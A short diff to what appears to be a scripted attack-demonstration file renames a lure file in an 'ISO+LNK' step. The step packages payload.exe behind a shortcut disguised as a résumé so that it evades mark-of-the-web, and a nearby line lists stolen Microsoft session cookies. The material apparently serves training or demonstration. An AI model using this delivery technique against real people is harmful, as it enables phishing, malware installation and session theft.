@@ -327,7 +327,7 @@ tokens       : 8 cookies — ESTRPSession, ESTSAUTH, SignInStateCookie, ...
           },
           {
             comment: "3) ISO+LNK — bypass mark-of-the-web (MOTW)",
-            cmd: "create-iso-lnk.sh payload.exe \"Curriculo Wallyson.lnk\" -o curriculo.iso",
+            cmd: "create-iso-lnk.sh payload.exe \"Curriculo Ana.lnk\" -o curriculo.iso",
             out: `(ISO mountável; LNK aponta para EXE oculto. Outlook NÃO marca como MOTW.)`,
             outType: "default",
           },
